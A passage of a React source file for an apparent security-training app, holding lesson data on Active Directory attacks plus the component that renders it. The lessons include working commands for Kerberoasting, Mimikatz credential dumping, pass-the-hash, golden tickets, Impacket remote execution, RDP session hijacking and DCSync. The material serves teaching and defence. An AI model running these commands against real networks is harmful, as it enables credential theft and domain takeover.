                    if (PatternMatch(buffer + i, pattern, mask, patternSize)) {
                        results[found].address = (PBYTE)mbi.BaseAddress + i;
                        results[found].size = patternSize;
                        found++;
                        
                        printf("[+] Found at 0x%p\\n", results[found-1].address);
                        
                        if (found >= maxResults) break;
                    }
                }
            }
            free(buffer);
        }
        
        address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    
    return found;
}

int main() {
    // Example: Find all instances of "MZ" (DOS header magic)
    BYTE pattern[] = { 0x4D, 0x5A };  // "MZ"
    BYTE mask[] = { 'x', 'x' };       // Match both bytes exactly
    
    HANDLE hProcess = GetCurrentProcess();
    SCAN_RESULT results[100];
    
    printf("[*] Scanning for MZ headers...\\n");
    DWORD count = ScanPattern(
        hProcess, pattern, mask, sizeof(pattern),
        results, 100
    );
    
    printf("\\n[+] Found %lu matches\\n", count);
    return 0;
}`,
            language: "c"
          }
        }
      ]
    },
    "active-directory": {
      title: "Active Directory Security",
      description: "Understanding and exploiting Active Directory environments",
      sections: [
        {
          type: "intro",
          content: `Active Directory (AD) is the backbone of enterprise Windows networks, managing authentication, authorization, and resources across the domain. Understanding AD security is essential for penetration testers, red teamers, and defenders alike. This module covers AD fundamentals, enumeration, and attack techniques.`
        },
        {
          title: "Active Directory Fundamentals",
          content: `Active Directory is a hierarchical directory service that stores information about network objects and makes this information available to users and administrators.

**Core Components:**
• **Domain Controller (DC)** - Server running AD DS, handles authentication
• **Domain** - Logical grouping of objects (users, computers, groups)
• **Forest** - Collection of domains sharing a common schema
• **Organizational Unit (OU)** - Container for organizing objects
• **Group Policy (GPO)** - Centralized configuration management

**Key Protocols:**
• **LDAP** - Lightweight Directory Access Protocol (389/636)
• **Kerberos** - Primary authentication protocol (88)
• **NTLM** - Legacy authentication, still widely used
• **DNS** - Domain Name System (integrated with AD)
• **SMB** - Server Message Block for file shares (445)

**Authentication Flow (Kerberos):**
1. User requests TGT from KDC (AS-REQ)
2. KDC validates password, issues TGT (AS-REP)
3. User presents TGT, requests service ticket (TGS-REQ)
4. KDC issues service ticket (TGS-REP)
5. User authenticates to service with ticket`,
          concepts: [
            { label: "TGT", explanation: "Ticket Granting Ticket - Obtained from KDC, used to request service tickets. Valid for 10 hours by default." },
            { label: "TGS", explanation: "Ticket Granting Service - Issues service tickets when presented with valid TGT." },
            { label: "SPN", explanation: "Service Principal Name - Unique identifier for a service instance (HTTP/web.corp.local)." },
            { label: "KRBTGT", explanation: "Service account for KDC. Its hash encrypts all TGTs - compromise = Golden Ticket." }
          ]
        },
        {
          title: "AD Enumeration Techniques",
          content: `Enumeration is the first step in attacking AD. The goal is to understand the environment, identify targets, and find attack paths.

**Enumeration Targets:**
• Domain information (functional level, trusts)
• Users (privileged accounts, service accounts)
• Groups (Domain Admins, Enterprise Admins)
• Computers (DCs, servers, workstations)
• Group Policy Objects (password policies, scripts)
• Access Control Lists (delegation, permissions)

**Tools for Enumeration:**
• **PowerView** - PowerShell AD enumeration
• **BloodHound** - Graph-based attack path analysis
• **ADExplorer** - GUI LDAP browser
• **ldapsearch** - Command-line LDAP queries

**Key LDAP Queries:**
• All users: (objectClass=user)
• Domain Admins: (memberOf=CN=Domain Admins,...)
• Computers: (objectClass=computer)
• SPNs: (servicePrincipalName=*)`,
          example: {
            title: "PowerShell AD Enumeration",
            code: `# Import Active Directory module
Import-Module ActiveDirectory

# Get domain information
$domain = Get-ADDomain
Write-Host "[*] Domain: $($domain.DNSRoot)"
Write-Host "[*] Domain SID: $($domain.DomainSID)"
Write-Host "[*] Forest: $($domain.Forest)"
Write-Host "[*] Domain Controllers:"
Get-ADDomainController -Filter * | ForEach-Object {
    Write-Host "    - $($_.Name) ($($_.IPv4Address))"
}

# Enumerate privileged groups
Write-Host "`n[*] Domain Admins:"
Get-ADGroupMember "Domain Admins" -Recursive | ForEach-Object {
    Write-Host "    - $($_.SamAccountName)"
}

Write-Host "`n[*] Enterprise Admins:"
Get-ADGroupMember "Enterprise Admins" -Recursive | ForEach-Object {
    Write-Host "    - $($_.SamAccountName)"
}

# Find service accounts (users with SPNs)
Write-Host "`n[*] Kerberoastable Accounts:"
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    ForEach-Object {
        Write-Host "    - $($_.SamAccountName): $($_.ServicePrincipalName[0])"
    }

# Find accounts with no pre-auth (ASREPRoastable)
Write-Host "`n[*] ASREPRoastable Accounts:"
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {
    Write-Host "    - $($_.SamAccountName)"
}

# Find computers with unconstrained delegation
Write-Host "`n[*] Unconstrained Delegation:"
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | ForEach-Object {
    Write-Host "    - $($_.Name)"
}`,
            language: "powershell"
          }
        },
        {
          title: "Kerberos Attacks",
          content: `Kerberos, while more secure than NTLM, has several well-known attack vectors due to design decisions and common misconfigurations.

**Kerberoasting:**
Service tickets are encrypted with the service account's password hash. Any domain user can request tickets for any SPN and attempt offline cracking.
• Request TGS for accounts with SPNs
• Extract encrypted ticket
• Crack offline with hashcat/john

**ASREPRoasting:**
Accounts with "Do not require Kerberos pre-authentication" can have their AS-REP cracked offline.
• No credentials needed to request AS-REP
• Hash in response can be cracked
• Often found on legacy service accounts

**Golden Ticket:**
With the KRBTGT hash, forge TGTs for any user.
• Requires domain compromise first (to get KRBTGT hash)
• Tickets valid for 10 years by default
• Survives password changes (until KRBTGT rotated twice)

**Silver Ticket:**
Forge TGS for a specific service using its password hash.
• Only works against that specific service
• Doesn't touch DC, harder to detect
• Useful for persistence on specific servers`,
          warning: `Kerberoasting is often the fastest path to domain admin. Service accounts frequently have weak passwords and domain admin privileges.`,
          example: {
            title: "Kerberoasting with PowerShell",
            code: `# Method 1: Using Rubeus
.\\Rubeus.exe kerberoast /outfile:hashes.txt

# Method 2: Pure PowerShell
Add-Type -AssemblyName System.IdentityModel

# Get all SPNs
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.Filter = "(servicePrincipalName=*)"
$results = $search.FindAll()

foreach ($result in $results) {
    $userEntry = $result.GetDirectoryEntry()
    
    foreach ($spn in $userEntry.servicePrincipalName) {
        Write-Host "[*] Requesting ticket for: $spn"
        
        try {
            # Request the ticket
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            
            # Extract the hash (simplified - real extraction is more complex)
            $ticketBytes = $ticket.GetRequest()
            $hexHash = [BitConverter]::ToString($ticketBytes) -replace '-'
            
            Write-Host "[+] Got ticket for $spn"
            # In practice, extract and format for hashcat/john
        }
        catch {
            Write-Host "[-] Failed: $spn"
        }
    }
}

# Crack with hashcat:
# hashcat -m 13100 hashes.txt wordlist.txt`,
            language: "powershell"
          }
        },
        {
          title: "Lateral Movement",
          content: `Once credentials are obtained, lateral movement allows spreading across the network to reach high-value targets.

**Pass-the-Hash (PtH):**
Use NTLM hash directly without knowing the password.
• Works with NTLM authentication (not Kerberos)
• Common with psexec, wmiexec, smbexec
• Detected by modern EDRs

**Pass-the-Ticket (PtT):**
Use stolen Kerberos tickets.
• Extract tickets from memory with Mimikatz
• Import on different machine
• Impersonate the ticket owner

**Overpass-the-Hash:**
Use NTLM hash to request Kerberos tickets.
• Combines PtH with Kerberos
• More stealthy than pure NTLM
• Appears as normal Kerberos authentication

**RDP Hijacking:**
Take over disconnected RDP sessions.
• tscon command to switch sessions
• Requires SYSTEM privileges
• No password needed for disconnected sessions`,
          example: {
            title: "Lateral Movement Examples",
            code: `# =========== Mimikatz Commands ===========

# Dump credentials from LSASS
mimikatz # sekurlsa::logonpasswords

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:abc123... /run:cmd

# Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Pass-the-Ticket
mimikatz # kerberos::ptt ticket.kirbi

# Golden Ticket (requires KRBTGT hash)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:abc123... /ptt

# =========== Impacket Examples ===========

# PsExec with hash
impacket-psexec corp.local/admin@target -hashes :abc123...

# WMI Exec
impacket-wmiexec corp.local/admin@target -hashes :abc123...

# SMB Exec (more stealthy)
impacket-smbexec corp.local/admin@target -hashes :abc123...

# =========== RDP Hijacking ===========

# List sessions
query user

# Hijack session (requires SYSTEM)
# Creates service to run tscon
sc create hijack binpath= "cmd.exe /k tscon 2 /dest:console"
net start hijack`,
            language: "powershell"
          },
          tip: `Always check for cached credentials on compromised systems. Users who have logged in leave hashes in LSASS memory.`
        },
        {
          title: "Domain Dominance",
          content: `The ultimate goal is often complete domain control. These techniques establish persistent, privileged access.

**DCSync:**
Replicate domain credentials using Directory Replication privileges.
• Mimics domain controller behavior
• Extracts any account's hash
• Requires Replicating Directory Changes rights
• Often available to Domain Admins

**DCShadow:**
Register a rogue Domain Controller.
• Push malicious changes to AD
• Can modify any object
• Extremely stealthy - uses legitimate replication
• Requires elevated privileges

**AdminSDHolder & SDProp:**
Abuse the AdminSDHolder protection mechanism.
• Modify AdminSDHolder ACL
• SDProp (runs every 60 min) propagates to protected groups
• Grants persistent access to Domain Admins
• Survives password changes

**ADCS Attacks (AD Certificate Services):**
Abuse certificate templates and CA permissions.
• ESC1-ESC8 attack classes
• Request certificates as other users
• Persist across password changes`,
          example: {
            title: "DCSync Attack",
            code: `# DCSync with Mimikatz
# Extracts password hashes by simulating DC replication

# Get specific user's hash (e.g., krbtgt for Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Get all domain hashes
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync with Impacket (from Linux)
impacket-secretsdump corp.local/admin:'Password123'@DC01.corp.local

# With hashes
impacket-secretsdump corp.local/admin@DC01.corp.local -hashes :abc123...

# =========== Required Privileges ===========
# These rights enable DCSync:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes in Filtered Set

# Check current user's rights
# PowerShell:
Get-ADUser -Identity (whoami).Split('\\')[1] -Properties * | 
    Select-Object -ExpandProperty MemberOf

# Check if user has DCSync rights
$acl = Get-Acl "AD:\\DC=corp,DC=local"
$acl.Access | Where-Object {
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or  # DS-Replication-Get-Changes
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"      # DS-Replication-Get-Changes-All
}`,
            language: "powershell"
          },
          warning: `DCSync is a high-impact attack that often triggers alerts. Modern SIEMs and EDRs monitor for replication from non-DC sources.`
        }
      ]
    }
  };

  const currentLesson = lessons[moduleId];

  if (!currentLesson) {
    return (
      <Card className="flex flex-col glass h-full min-h-[500px]">
        <div className="flex-1 flex items-center justify-center p-8">
          <div className="text-center space-y-4">
            <BookOpen className="h-16 w-16 text-muted-foreground mx-auto opacity-50" />
            <p className="text-lg text-muted-foreground">Select a module to start learning</p>
          </div>
        </div>
      </Card>
    );
  }

  return (
    <Card className="flex flex-col glass overflow-hidden h-full min-h-[500px]">
      {/* Header */}
      <div className="p-4 border-b border-border/50 bg-gradient-to-r from-primary/10 via-primary/5 to-transparent shrink-0">
        <div className="flex items-center gap-3">
          <div className="p-2 rounded-lg bg-primary/20 border border-primary/30">
            <BookOpen className="h-5 w-5 text-primary" />
          </div>
          <div className="min-w-0 flex-1">
            <h3 className="font-semibold text-foreground truncate">{currentLesson.title}</h3>
            <p className="text-xs text-muted-foreground truncate">{currentLesson.description}</p>
          </div>
        </div>
      </div>
      
      {/* Content */}
      <ScrollArea className="flex-1">
        <div className="p-4 md:p-6 space-y-6">
          {currentLesson.sections.map((section: any, idx: number) => (
            <div key={idx} className="space-y-4">
              {/* Intro Section */}
              {section.type === "intro" && (
                <div className="p-4 rounded-lg bg-primary/10 border-l-4 border-primary">
                  <p className="text-sm text-foreground leading-relaxed">{section.content}</p>
                </div>
              )}

              {/* Regular Section */}
              {!section.type && (
                <>
                  {/* Section Title */}
                  {section.title && (
                    <div className="flex items-start gap-3 pt-2">
                      <div className="mt-0.5 w-7 h-7 rounded-full bg-primary/20 flex items-center justify-center text-xs font-bold text-primary shrink-0">
                        {idx}
                      </div>
                      <h4 className="text-lg font-bold text-foreground">{section.title}</h4>
                    </div>
                  )}

                  {/* Main Content */}
                  {section.content && (
                    <div className="ml-10 space-y-3">
                      <div className="prose prose-sm max-w-none">
                        <p className="text-sm text-foreground/90 leading-relaxed whitespace-pre-line">
                          {section.content}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Key Concepts Box */}
                  {section.concepts && section.concepts.length > 0 && (
                    <div className="ml-10 p-4 rounded-lg bg-concept-bg/50 border border-concept-border/50">
                      <div className="flex items-center gap-2 mb-3">
                        <Brain className="h-4 w-4 text-concept-border" />
                        <h5 className="font-semibold text-concept-text text-xs uppercase tracking-wider">Key Concepts</h5>
                      </div>
                      <div className="space-y-2">
                        {section.concepts.map((concept: any, i: number) => (
                          <div key={i} className="flex gap-3 items-start">
                            <code className="text-xs font-mono text-concept-border bg-concept-bg px-2 py-0.5 rounded shrink-0">
                              {concept.label}
                            </code>
                            <p className="text-xs text-concept-text/90 leading-relaxed">
                              {concept.explanation}
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Tip Box */}
                  {section.tip && (
                    <div className="ml-10 p-3 rounded-lg bg-tip-bg/50 border border-tip-border/50">
                      <div className="flex items-start gap-2">
                        <Lightbulb className="h-4 w-4 text-tip-border shrink-0 mt-0.5" />
                        <p className="text-xs text-tip-text leading-relaxed">{section.tip}</p>
                      </div>
                    </div>
                  )}

                  {/* Warning Box */}
                  {section.warning && (
                    <div className="ml-10 p-3 rounded-lg bg-warning/10 border border-warning/30">
                      <div className="flex items-start gap-2">
                        <AlertTriangle className="h-4 w-4 text-warning shrink-0 mt-0.5" />
                        <p className="text-xs text-warning leading-relaxed">{section.warning}</p>
                      </div>
                    </div>
                  )}

                  {/* Example Box */}
                  {section.example && (
                    <div className="ml-10 space-y-0">
                      <div className="p-3 rounded-t-lg bg-example-bg/50 border border-example-border/50 border-b-0">
                        <div className="flex items-center gap-2">
                          <Code className="h-4 w-4 text-example-border" />
                          <h5 className="font-semibold text-example-text text-xs">{section.example.title}</h5>
                        </div>
                        {section.example.description && (
                          <p className="text-xs text-example-text/70 mt-1 ml-6">
                            {section.example.description}
                          </p>
                        )}
                      </div>
                      <div className="relative">
                        <div className="absolute top-2 right-2 z-10">
                          <Badge variant="secondary" className="text-[10px] font-mono bg-background/80 backdrop-blur px-1.5 py-0.5">
                            {section.example.language || "c"}
                          </Badge>
                        </div>
                        <pre className="bg-code-bg p-4 rounded-b-lg overflow-x-auto text-xs border border-example-border/50 border-t-0 max-h-80">
                          <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed text-[11px]">
                            {section.example.code}
                          </code>
                        </pre>
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          ))}

          {/* Completion */}
          <div className="flex items-center justify-center gap-2 pt-4 border-t border-border/30">
            <CheckCircle2 className="h-4 w-4 text-success" />
            <p className="text-xs text-muted-foreground">
              Section complete - try the code in the editor
            </p>
          </div>
        </div>
      </ScrollArea>
    </Card>
  );
};

export default LessonViewer;
